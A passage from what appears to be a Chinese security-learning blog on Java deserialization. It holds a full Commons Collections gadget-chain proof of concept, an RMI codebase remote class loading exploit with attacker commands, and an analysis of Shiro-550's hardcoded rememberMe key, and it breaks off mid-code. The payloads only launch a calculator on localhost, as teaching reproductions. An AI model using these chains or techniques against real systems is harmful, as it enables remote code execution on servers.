<h4 id="改写InvokerTransformer"><a href="#改写InvokerTransformer" class="headerlink" title="改写InvokerTransformer"></a>改写InvokerTransformer</h4><p>记得前面我们只是添加了在InvokerTransformer中添加了占位符号，下面需要改一下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.clear();<span class="comment">//需要把lazyMap中我们之前加入的没用的map给移除</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">iMethodName</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">iMethodName.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="POC构造-3"><a href="#POC构造-3" class="headerlink" title="POC构造"></a>POC构造</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, CannotCompileException, NotFoundException, IOException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">/*构造恶意字节码*/</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);<span class="comment">//</span></span><br><span class="line">        cc.setName(<span class="string">&quot;Leihehe&quot;</span>);</span><br><span class="line">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));<span class="comment">//</span></span><br><span class="line">        <span class="type">byte</span>[] evilbytes = cc.toBytecode();<span class="comment">//恶意字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*配置TemplatesImpl - 加载恶意class到jvm*/</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilbytes&#125;);<span class="comment">//这里传入的evilbytes需要在byte[][]中</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;LeiHello&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//任意方法调用templates.newTransformer()或者templates.getOutputProperties即可触发</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*构造invokerTransformer来调用newTransformer()方法*/</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, invokerTransformer);<span class="comment">//需要把lazyMap中我们之前加入的没用的map给移除</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*利用HashMap反序列化中的hash(key)方法，触发利用链*/</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;helloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.clear();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iMethodName</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iMethodName.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>));</span><br><span class="line">        outputStream.writeObject(hashMap);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102172023830.png" alt="image-20220102172023830"></p>
<p>另一版本的POC我也放在仓库**<a href="https://github.com/leihehehe/Java-deserialization-vulnerability">Java-deserialization-vulnerability</a>**上了（流程是一样的，不过是提取了一些方法，看起来更简洁一些）</p>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>终于学完了cc链，收获非常多，尤其是对java反射、代理和利用链的构造思路有了更深的理解。也非常感谢网上各位师傅无私的共享，才能让我看到这么精彩的分析。</p>
<h1 id="RMI反序列化漏洞"><a href="#RMI反序列化漏洞" class="headerlink" title="RMI反序列化漏洞"></a>RMI反序列化漏洞</h1><h2 id="RMI前置知识"><a href="#RMI前置知识" class="headerlink" title="RMI前置知识"></a>RMI前置知识</h2><p><a href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a></p>
<h2 id="Codebase远程命令执行"><a href="#Codebase远程命令执行" class="headerlink" title="Codebase远程命令执行"></a>Codebase远程命令执行</h2><h3 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h3><p>在有些环境条件下，我们需要远程加载一些本地不存在的类，而<code>codebase</code>便是用来告诉JAVA应该从哪里远程加载本地不存在的类。</p>
<p>codebase可以是http, ftp这样的url地址，例如当我们加载<strong>example</strong>类时，Java发现本地并不存在这样的类，它就会去codebase指向的地址搜索下载<strong>example</strong>类并加载。</p>
<p>如果codebase是可控的，那么我们就可以让服务器恶意加载我们的攻击类（这个类在服务器上并不存在）。</p>
<p>Java官方自然注意到了这一点，于是采用了一些安全措施，让我们不能随意远程加载类，如果我们一定要加载远程类，需要满足以下条件：</p>
<ul>
<li>Server安装并配置了<strong>SecurityManager</strong></li>
<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code><ul>
<li>useCodebaseOnly参数在7u21、6u45版本之后默认设置为<strong>true</strong>，表示Java虚拟机将只信任预先配置好的codebase ，不再支持从RMI请求中获取</li>
</ul>
</li>
</ul>
<p>该漏洞利用条件苛刻，因此少有人对此进行深入研究，P神在<strong>JAVA安全漫谈</strong>中提到了该漏洞，我在复现的时候遇到了很多坑，网上的大部分资料细节都交代得不清不楚，很难弄懂，单单是这个漏洞就花了我很长时间去复现，此文将详细讲解原理，希望能够帮大家弄懂每一步。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="被攻击方"><a href="#被攻击方" class="headerlink" title="被攻击方"></a>被攻击方</h4><p><strong>RemoteRMIServer.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;<span class="comment">//设置SecurityManager</span></span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);<span class="comment">//绑定service Calc</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ICalc.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;<span class="comment">//功能接口</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Calc.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;<span class="comment">//实现功能</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击方"><a href="#攻击方" class="headerlink" title="攻击方"></a>攻击方</h4><p><strong>RMIClient</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* static 方法里是我们的恶意执行代码 */</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;<span class="comment">//同样需要安装SecurityManager</span></span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>);<span class="comment">//查找Registry上的refObj service</span></span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));<span class="comment">//这里调用了远程方法的sum(),并传入了li对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>为什么RMIClient这样写就能触发漏洞呢？</strong></p>
<p>实际上，我们在<a href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a>就有提到过，远程方法的调用是在server进行的，而并非<strong>本地client端</strong>，同时，远程调用的方法参数是经过序列化的。</p>
<p>拿这个例子来说，我们首先用<code>ICalc r = (ICalc) Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;);</code>找到了<strong>Registry</strong>上的<strong>refobj</strong>方法，又调用了其<strong>sum</strong>方法。关键点在于，我们在调用其<strong>sum</strong>方法的时候传入了我们在本地构造的 <code>Payload</code> 类型的对象 <code>li</code>，<code>li</code>被序列化，随<code>sum()</code>传入<strong>server进行调用</strong>，接着server端会对它进行<strong>反序列化</strong>。在反序列化的过程中，<strong>RemoteRMIServer.java</strong>发现这个Payload类它并不认识，因为在server端并没有该类。于是它就去<strong>codebase</strong>指向的地址上找Payload类，找到后将该类的定义下载下来，然后才能反序列化<code>li</code>对象。</p>
<p>而我们的Payload类的static方法中有恶意代码(此处我们是将payload类和RMIClient写在一起了)，所以当server加载后，会执行该恶意代码。</p>
<h4 id="Policy配置"><a href="#Policy配置" class="headerlink" title="Policy配置"></a>Policy配置</h4><p>Server端和Client端都需要新建一个文件来控制RMI的访问权限，这里我们命名为<strong>client.policy</strong></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h4><p>我们在IDEA中选择build project，让它生成class文件。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212231734543.png" alt="image-20211212231734543"></p>
<p>此时out目录下会生成我们所有的class文件</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212234937446.png" alt="image-20211212234937446"></p>
<p>在真实环境中，<strong>RMIClient</strong>是在攻击者的电脑上运行的，所以我把<strong>RMIClient</strong>移动到<strong>其他目录</strong>下来模拟这个环境。</p>
<p>如果你进入out/production/RM_ITEST生成目录（不在IDEA中）下看的话，你会发现还有一个class文件 - <strong>RMIClient$Payload.class</strong>，这是我们在RMIClient内部生成的class文件，也就是Server会去找的Payload类，我们也不能让它与<strong>RemoteRMIServer.class</strong>在一个目录，不然Server端是能在本地找到Payload类的，从而不能触发漏洞。同样将它移动到其他目录去，这里我把它和<strong>RMIClient.class、ICalc</strong>放一起。</p>
<p>这里可能会有疑问为什么要将<strong>ICalc</strong>也放在这，因为我们在Client的代码中将stub转换成了ICalc类，所以也得放在一起。那能不能不转换呢？答案是不可以，经过测试，Stub必须被转化为相应的类，否则call其方法的时候不会有反应。注意这里也需要client.policy,因为我们在client也配置了SecurityManager</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001727380.png" alt="image-20211213001727380"></p>
<p>一切准备就绪，先运行Server端</p>
<p>这里我选择用<strong>terminal</strong>来执行，你也可以使用IDEA的配置来执行</p>
<p><code>java -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</code></p>
<p>此处<strong>hostname</strong>为你RMI服务器的地址，<strong>security.policy</strong>是我们之前创建的policy文件的名字，<strong>RemoteRMIServer</strong>是我们要运行的Java class文件名字</p>
<p>你需要在生成的相关<strong>class</strong>文件目录下运行命令(之前一直在IDEA下面的terminal运行，运行实际是在java文件目录下，导致卡在这里很久)</p>
<p>接着你需要模仿攻击者，在你的恶意类(RMIClient$Payload.class)所在目录搭建一个<strong>http</strong>服务，供<strong>server</strong>端访问下载你的恶意类</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233501619.png" alt="image-20211212233501619"></p>
<p>此处我使用python，在本地搭建了一个8080端口的web服务</p>
<p>接着，可以用<strong>RMIClient</strong>实施攻击了</p>
<p><code>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:8080/ -Djava.security.policy=client.policy RMIClient</code></p>
<p>这里的codebase是你搭建的web服务地址，<strong>RMIClient</strong>为你运行的Class名字。</p>
<p>成功弹出计算器！<strong>计算器被弹出两次</strong>，第一次是因为Client创建Payload实例(在攻击者电脑上弹出)，第二次是远程执行(在被攻击服务端上弹出)。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233854484.png" alt="image-20211212233854484"></p>
<p>同时我们在python运行的web服务上也能看到class加载记录</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001956198.png" alt="image-20211213001956198"></p>
<h3 id="Reference-6"><a href="#Reference-6" class="headerlink" title="Reference"></a>Reference</h3><p>P神 - Java安全漫谈</p>
<h1 id="Shiro反序列化漏洞系列"><a href="#Shiro反序列化漏洞系列" class="headerlink" title="Shiro反序列化漏洞系列"></a>Shiro反序列化漏洞系列</h1><h2 id="Shiro550反序列化漏洞"><a href="#Shiro550反序列化漏洞" class="headerlink" title="Shiro550反序列化漏洞"></a>Shiro550反序列化漏洞</h2><h3 id="环境搭建-8"><a href="#环境搭建-8" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<p>在Intellij中将<strong>samples/web</strong>以项目的形式打开，在pom.xml中将jstl修改为1.2版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>整个project将使用jdk1.8</p>
<p>Tomcat配置如下：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223132310175.png" alt="image-20211223132310175"></p>
<p>运行即可。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223151852743.png" alt="image-20211223151852743"></p>
<h3 id="反序列化触发流程"><a href="#反序列化触发流程" class="headerlink" title="反序列化触发流程"></a>反序列化触发流程</h3><h4 id="入手点"><a href="#入手点" class="headerlink" title="入手点"></a>入手点</h4><p>问题主要出在登录处的<strong>Remember Me</strong>功能。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152235321.png" alt="image-20211223152235321"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152603584.png" alt="image-20211223152603584"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152643912.png" alt="image-20211223152643912"></p>
<p>我们发现登陆后的cookie中会有rememberMe的字段，同时后面跟了一长串的数据。</p>
<p>我们猜测rememberMe可能保存了我们的账号密码数据</p>
<p>为了验证我们的猜想，在Intellij中连续按两下shift，搜索RememberMe</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223153240686.png" alt="image-20211223153240686"></p>
<p>这里找到了相关的Class，我们进入AbstractRememberMeManager看一下</p>
<p>看名字，我们就能猜出是和Remember Me这个功能有关</p>
<p>看一下它的constructor</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<span class="comment">//此处设置了cipher key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setEncryptionCipherKey(cipherKey);</span><br><span class="line">    <span class="built_in">this</span>.setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEncryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] encryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDecryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] decryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现，<strong>AbstractRememberMeManager</strong>被创建的时候，会<strong>setCipherKey</strong>，而这个key是默认的。</p>
<p>分析到这里，好像和我们的remember Me没什么关系，继续往下看。</p>
<h4 id="RememberMe生成"><a href="#RememberMe生成" class="headerlink" title="RememberMe生成"></a>RememberMe生成</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223154957970.png" alt="image-20211223154957970"></p>
<p>我们在登录成功这里下个断点,发现他会call到rememberIdentity()</p>
<p>我们跟进去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="built_in">this</span>.getIdentityToRemember(subject, authcInfo);<span class="comment">//1</span></span><br><span class="line">    <span class="built_in">this</span>.rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">protected</span> PrincipalCollection <span class="title function_">getIdentityToRemember</span><span class="params">(Subject subject, AuthenticationInfo info)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info.getPrincipals();<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们发现principals实际上我们的登录名</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163019109.png" alt="image-20211223163019109"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="built_in">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="built_in">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取到账号后，又会call到rememberIdentity()</p>
<p>我们跟进convertPrincipalsToBytes()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163224292.png" alt="image-20211223163224292"></p>
<p>再跟进encrpyt()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163334597.png" alt="image-20211223163334597"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getEncryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>encryptionCipherKey</code>在之前分析的时候出现过</p>
<p>再回顾一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<span class="comment">//此处设置了cipher key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setEncryptionCipherKey(cipherKey);<span class="comment">//设置加密密钥</span></span><br><span class="line">    <span class="built_in">this</span>.setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEncryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] encryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.encryptionCipherKey = encryptionCipherKey;<span class="comment">//由此我们可以看出，其实encryptionCipherKey就是上面默认的key</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDecryptionCipherKey</span><span 